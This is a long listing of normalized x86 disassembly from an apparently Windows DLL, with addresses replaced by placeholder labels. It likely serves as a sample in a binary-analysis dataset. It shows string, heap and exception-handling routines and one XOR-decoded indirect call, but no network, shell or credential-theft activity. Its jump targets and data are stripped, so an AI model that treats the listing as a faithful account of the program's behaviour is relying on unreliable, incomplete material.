mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x3
ja r-xdata
push r--data
call sub_100651be
call sub_10012830
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
lea eax [ esi + 0x54 ]
push eax
push ebx
lea eax [ ebp - 0x174 ]
call sub_100215e0
push 0x227a9
lea esi [ ebp - 0x68 ]
mov [ ebp - 0x184 ] eax
call sub_10051c40
add esp 0x4
push eax
lea edx [ ebp - 0x12c ]
push r--data
push edx
mov [ ebp - 0x4 ] 0xd
call sub_100282d0
add esp 0xc
mov [ ebp - 0x4 ] 0xf
cmp [ ebp - 0x54 ] 0x10
jb r-xdata
push r--data
call sub_100651be
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0x54 ] 0xf
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x68 ] 0x0
cmp ecx 0x4
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1000a86e
add esp 0x4
lea eax [ esi + 0x70 ]
push eax
lea eax [ ebp - 0x174 ]
call sub_10003290
push eax
push ebx
lea edi [ ebp - 0x12c ]
call sub_10017cc0
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x4
ja r-xdata
push r--data
call sub_100651be
lea eax [ esi + 0x70 ]
push eax
push ebx
lea eax [ ebp - 0x174 ]
call sub_100215e0
mov ecx [ ebp - 0x180 ]
push ecx
lea edx [ ebp - 0x84 ]
push edx
mov [ ebp - 0x17c ] eax
call sub_10015820
mov esi eax
lea eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x10
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x11
call sub_10069410
mov ecx eax
mov [ ebp - 0x4 ] 0x12
mov esi [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub esi edi
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push r--data
call sub_100651be
push 0xffffffff
push 0x0
push ecx
mov ecx edi
call sub_10004e10
mov edi 0x10
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_100651be
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0xf
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x70 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x188 ]
push ecx
lea edx [ ebp - 0x84 ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0x110 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x13
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x14
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0x15
mov ecx [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_1000a86e
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x1c ]
push esi
call sub_10004e10
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_100651be
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x70 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x178 ]
push ecx
lea edx [ ebp - 0x84 ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0xf4 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x16
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x17
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0x18
mov ecx [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_1000a86e
add esp 0x4
lea ecx [ edi + 0x38 ]
push 0xffffffff
xor edi edi
push edi
push esi
call sub_10004e10
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_100651be
mov [ ebp - 0x38 ] 0xf
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0xf
mov [ ebp - 0x1c ] 0xf
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x70 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x184 ]
push ecx
lea edx [ ebp - 0x84 ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x19
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x1a
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0x1b
mov ecx [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_1000a86e
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x54 ]
push esi
call sub_10004e10
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_100651be
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x70 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x17c ]
push ecx
lea edx [ ebp - 0x84 ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0x12c ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x1c
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x1d
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0x1e
mov ecx [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x4
ja r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_1000a86e
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x70 ]
push esi
call sub_10004e10
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_100651be
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x70 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_1000a86e
add esp 0x4
lea ecx [ ebp - 0x148 ]
push ecx
lea edi [ ebp - 0x174 ]
call sub_1001e5a0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] 0x1f
mov [ ebp - 0x17c ] esp
push 0xffffffff
xor esi esi
push esi
lea edx [ ebp - 0x148 ]
mov edi 0xf
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] esi
push edx
mov [ ecx ] 0x0
call sub_10037cf0
mov eax [ ebx + 0xe0 ]
push eax
push ebx
call sub_1005c6a0
mov ebx 0x10
mov [ ebp - 0x17c ] eax
cmp [ ebp - 0x134 ] ebx
jb r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x134 ] edi
mov [ ebp - 0x138 ] esi
mov [ ebp - 0x148 ] 0x0
cmp [ ebp - 0x118 ] ebx
jb r-xdata
mov ecx [ ebp - 0x148 ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x118 ] edi
mov [ ebp - 0x11c ] esi
mov [ ebp - 0x12c ] 0x0
cmp [ ebp - 0x8c ] ebx
jb r-xdata
mov edx [ ebp - 0x12c ]
push edx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x90 ] esi
mov [ ebp - 0xa0 ] 0x0
cmp [ ebp - 0xe0 ] ebx
jb r-xdata
mov eax [ ebp - 0xa0 ]
push eax
call sub_1000a86e
add esp 0x4
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xe4 ] esi
mov [ ebp - 0xf4 ] 0x0
cmp [ ebp - 0xfc ] ebx
jb r-xdata
mov ecx [ ebp - 0xf4 ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0xfc ] edi
mov [ ebp - 0x100 ] esi
mov [ ebp - 0x110 ] 0x0
cmp [ ebp - 0xc4 ] ebx
jb r-xdata
mov edx [ ebp - 0x110 ]
push edx
call sub_1000a86e
add esp 0x4
mov eax [ ebp - 0x174 ]
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xc8 ] esi
mov [ ebp - 0xd8 ] 0x0
cmp eax esi
je r-xdata
mov eax [ ebp - 0xd8 ]
push eax
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x174 ] esi
mov [ ebp - 0x170 ] esi
mov [ ebp - 0x16c ] esi
cmp [ ebp - 0xa8 ] ebx
jb r-xdata
mov ecx [ ebp - 0x17c ]
push ecx
mov ecx [ ebp - 0x170 ]
lea edx [ ebp - 0x168 ]
push edx
push ecx
push eax
call sub_10072070
mov edx [ ebp - 0x174 ]
push edx
call sub_1000a86e
add esp 0x14
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xac ] esi
mov [ ebp - 0xbc ] 0x0
cmp [ ebp - 0x150 ] ebx
jb r-xdata
mov eax [ ebp - 0xbc ]
push eax
call sub_1000a86e
add esp 0x4
mov eax [ ebp - 0x17c ]
mov ecx [ ebp - 0x164 ]
push ecx
call sub_1000a86e
add esp 0x4
sub_100255aa
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
call sub_100015fc
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ esi + 0x6 ] ax
jmp r-xdata
mov ax [ esi + 0x6 ]
mov [ esi + 0x4 ] 0x1
pop esi
retn
sub_100255da
push 0x38
mov eax sub_100857c1
call sub_10047689
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x3c ] 0x0
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007a10
and [ ebp - 0x4 ] 0x0
push eax
push 0x800
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1004ad92
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x34 ] eax
call sub_1002be90
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10046885
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x38 ] eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x4 ] eax
mov eax ebx
call sub_100262c3
retn 0x20
sub_10025690
push ebp
mov ebp esp
sub esp 0x8
push ebx
push edi
xor edi edi
push edi
xor eax eax
mov ecx esi
mov [ esi + 0x30 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0x201
mov [ esi + 0x18 ] 0x6
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
call sub_10039ae0
push 0x4
call sub_1002e3ac
mov ebx eax
add esp 0x4
cmp ebx edi
je r-xdata
mov [ esi + 0x30 ] edi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
call sub_1003e875
mov [ ebx ] eax
call sub_10004aa4
push edi
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_1000c927
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x8 ]
call sub_10003c9c
mov [ esi + 0x30 ] ebx
pop edi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ecx + 0x4 ] eax
sub_10025720
push ebp
mov ebp esp
push 0xffffffff
push sub_10086184
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
push esi
mov [ ebp - 0x4 ] 0x4
call sub_10071e07
mov eax [ esi + 0x1c ]
xor edi edi
add esp 0x4
cmp eax edi
je r-xdata
mov [ esi + 0x1c ] edi
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
push eax
call sub_1001b2d2
add esp 0x4
mov [ esi + 0x14 ] edi
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
push eax
call sub_1001b2d2
add esp 0x4
mov [ esi + 0xc ] edi
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
push eax
call sub_1001b2d2
add esp 0x4
mov ecx esi
mov [ esi + 0x4 ] edi
mov [ ebp - 0x4 ] 0xffffffff
call sub_10003c9c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push eax
call sub_1001b2d2
add esp 0x4
sub_100257d0
push esi
mov esi [ ecx + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
pop esi
jmp edx
sub_10025810
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ rw-data ]
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov al 0x38
xor [ ebp + 0x8 ] al
xor [ ebp + 0x9 ] al
xor [ ebp + 0xa ] al
xor [ ebp + 0xb ] al
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] 0x4
call [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_10025860
push ebp
mov ebp esp
push esi
push edi
mov edi eax
lea eax [ edi - 0x1 ]
cdq
sub eax edx
mov esi eax
sar esi 0x1
cmp [ ebp + 0x8 ] edi
jge r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov [ ebx + edi * 4 ] ecx
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov edx [ ebx + esi * 4 ]
push ecx
push edx
call [ ebp + 0x10 ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
mov eax [ edx ]
mov [ ebx + edi * 4 ] eax
pop edi
pop esi
pop ebp
retn
mov eax [ ebx + esi * 4 ]
mov [ ebx + edi * 4 ] eax
lea eax [ esi - 0x1 ]
cdq
sub eax edx
mov edi esi
sar eax 0x1
mov esi eax
cmp [ ebp + 0x8 ] edi
jl r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov [ ebx + edi * 4 ] edx
pop edi
pop esi
pop ebp
retn
sub_100258c5
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_1006ee94
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1000f103
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100234cf
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn 0x18
sub_10025940
cmp esi ebx
je r-xdata
mov eax esi
retn
mov eax [ esi ]
xor ecx ecx
cmp eax ecx
je r-xdata
mov [ esi ] ecx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov edx [ ebx ]
mov [ esi ] edx
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov edx [ ebx + 0x8 ]
mov [ esi + 0x8 ] edx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
push edi
mov edi [ esi + 0x4 ]
call sub_1006a100
mov eax [ esi ]
push eax
call sub_1000a86e
add esp 0x4
xor ecx ecx
pop edi
sub_100259bb
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_100259f1
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0xc ]
call sub_1001418e
test [ ebp + 0x8 ] ax
pop ecx
pop ecx
push 0x0
pop eax
setne al
pop ebp
retn 0x8
sub_10025a12
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ edi ] 0x0
jne r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov esi [ eax ]
mov eax [ eax + 0x4 ]
call sub_1006e175
mov esi [ eax + 0x8 ]
call sub_1002f5d0
jmp r-xdata
xor ecx ecx
mov [ eax ] cx
push [ ebp + 0xc ]
call sub_10045308
mov esi [ ebp + 0x14 ]
cmp [ esi ] 0x0
pop ecx
mov ebx eax
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov [ ebp + 0xc ] eax
test esi esi
jne r-xdata
test ebx ebx
jne r-xdata
mov al [ edi ]
push ebx
mov [ esi + 0x1 ] al
call sub_1003d06d
pop ecx
cmp eax 0x1
jle r-xdata
xor eax eax
inc eax
jmp r-xdata
movzx ecx [ edi ]
mov [ eax ] cx
movzx eax [ edi ]
mov ecx [ ebx + 0x4 ]
movzx eax [ ecx + eax + 0x1d ]
and eax 0x4
call sub_100302aa
movzx ecx [ edi ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
and [ esi ] 0x0
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push 0x2
push esi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push 0x1
push edi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_1003d06d
pop ecx
cmp [ ebp + 0x10 ] eax
jae r-xdata
test eax eax
je r-xdata
and [ esi ] 0x0
jmp r-xdata
push ebx
call sub_1003d06d
pop ecx
cmp eax 0x1
jle r-xdata
mov al [ edi ]
push 0xfffffffe
mov [ esi ] al
pop eax
jmp r-xdata
call sub_1005b670
mov [ eax ] 0x2a
or eax 0xffffffff
jmp r-xdata
cmp [ edi + 0x1 ] 0x0
jne r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push ebx
call sub_1003d06d
pop ecx
push eax
push edi
push 0x9
push [ ebp + 0xc ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_1003d06d
pop ecx
jmp r-xdata
jmp r-xdata
sub_10025b90
push ebp
mov ebp esp
push 0xffffffff
push sub_1008a28c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4f8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4a0 ] eax
mov [ ebp - 0x498 ] ebx
mov [ ebp - 0x494 ] ebx
mov [ ebp - 0x490 ] ebx
mov [ ebp - 0x4 ] ebx
xor ecx ecx
mov [ ebp - 0x468 ] 0x7
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x47c ] cx
mov [ ebp - 0x460 ] ebx
mov [ ebp - 0x45c ] ebx
lea edx [ ebp - 0x4a8 ]
mov [ ebp - 0x4 ] 0x1
push edx
mov [ ebp - 0x484 ] ebx
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ r--data ]
movsx ecx [ eax ]
xor ecx 0xffc4
and ecx 0xff
lea eax [ ebp - 0x488 ]
push eax
xor edx edx
mov [ ebp - 0x488 ] cx
mov ecx eax
push ecx
mov [ ebp - 0x486 ] dx
mov edx eax
mov eax [ rw-data ]
push edx
push 0x1
push 0x1
push eax
lea eax [ ebp - 0x43c ]
call sub_1005bf30
test eax eax
je r-xdata
lea eax [ ebp - 0x43c ]
lea edx [ eax + 0x2 ]
cmp [ ebp - 0x468 ] 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0x43c ]
push edx
lea ecx [ ebp - 0x47c ]
call sub_10034100
push edi
mov [ ebp - 0x460 ] edi
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
lea ecx [ ebp - 0x47c ]
lea edi [ ebp - 0x498 ]
mov [ ebp - 0x45c ] eax
call sub_1006dc90
lea edx [ ebp - 0x28 ]
mov eax 0xfd
call sub_10069020
push ebx
push r--data
push ebx
push ebx
push r--data
push ebx
push ebx
push ebx
push ebx
push r--data
mov ecx edx
mov edx [ ebp - 0x4a0 ]
push ecx
push ebx
push edx
push ebx
push r--data
push esi
xor edx edx
xor ecx ecx
lea esi [ ebp - 0x504 ]
call sub_10019a40
mov eax esi
push eax
lea edi [ ebp - 0x43c ]
call sub_1000f870
mov edi 0x7
xor ecx ecx
mov [ ebp - 0x480 ] ebx
mov [ ebp - 0x49c ] ebx
mov [ ebp - 0x444 ] edi
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x458 ] cx
lea edx [ ebp - 0x458 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_10028620
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0x47c ]
push ecx
call sub_1000a86e
add esp 0x4
lea eax [ ebp - 0x480 ]
push eax
lea ecx [ ebp - 0x498 ]
push ecx
lea ecx [ ebp - 0x49c ]
lea edx [ ebp - 0x458 ]
call sub_10008d50
test eax eax
je r-xdata
mov esi 0x8
cmp [ ebp - 0x444 ] esi
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x49c ]
cmp eax 0x1e84800
jge r-xdata
mov [ ebp - 0x484 ] 0x3
jmp r-xdata
xor eax eax
mov [ ebp - 0x458 ] ax
lea eax [ ebp - 0x504 ]
mov [ ebp - 0x444 ] edi
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x4 ] 0x1
call sub_10054bf0
cmp [ ebp - 0x468 ] esi
jb r-xdata
mov edx [ ebp - 0x458 ]
push edx
call sub_1000a86e
add esp 0x4
lea edx [ ebp - 0x484 ]
mov eax 0x114
call sub_10069020
mov eax edx
push eax
mov eax [ rw-data ]
mov ecx edx
push ecx
push edx
push 0x1
push 0x1
push eax
lea eax [ ebp - 0x234 ]
mov [ ebp - 0x488 ] 0x1
call sub_1005bf30
test eax eax
jne r-xdata
mov edx [ ebp - 0x480 ]
push ebx
push eax
mov eax [ rw-data ]
push edx
push eax
xor edx edx
xor ecx ecx
call sub_10003660
test eax eax
je r-xdata
mov edi [ ebp - 0x498 ]
mov esi [ HeapFree@IAT ]
cmp edi [ ebp - 0x494 ]
je r-xdata
mov esi [ ebp - 0x498 ]
xor edx edx
mov [ ebp - 0x468 ] edi
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x47c ] dx
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x47c ]
push ecx
call sub_1000a86e
add esp 0x4
mov edi [ ebp - 0x498 ]
mov esi [ HeapFree@IAT ]
cmp edi [ ebp - 0x494 ]
je r-xdata
mov ecx [ ebp - 0x49c ]
mov edx [ ebp - 0x480 ]
push ecx
push edx
lea eax [ ebp - 0x234 ]
call sub_1002f360
add esp 0x8
mov [ ebp - 0x488 ] eax
mov [ ebp - 0x484 ] 0x4
mov eax [ ebp - 0x480 ]
cmp eax ebx
je r-xdata
mov edi edi
mov eax 0x2
jmp r-xdata
mov edi [ ebp - 0x494 ]
mov eax esi
call sub_1006a100
push esi
call sub_1000a86e
add esp 0x4
mov eax [ ebp - 0x480 ]
cmp eax ebx
je r-xdata
mov eax [ edi + 0x1c ]
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call esi
add edi 0x24
cmp edi [ ebp - 0x494 ]
jne r-xdata
mov esi 0x8
cmp [ ebp - 0x444 ] esi
jb r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call esi
mov [ ebp - 0x480 ] ebx
mov ecx [ edi + 0x1c ]
push ecx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call esi
add edi 0x24
cmp edi [ ebp - 0x494 ]
jne r-xdata
cmp [ ebp - 0x488 ] ebx
je r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call esi
mov [ ebp - 0x480 ] ebx
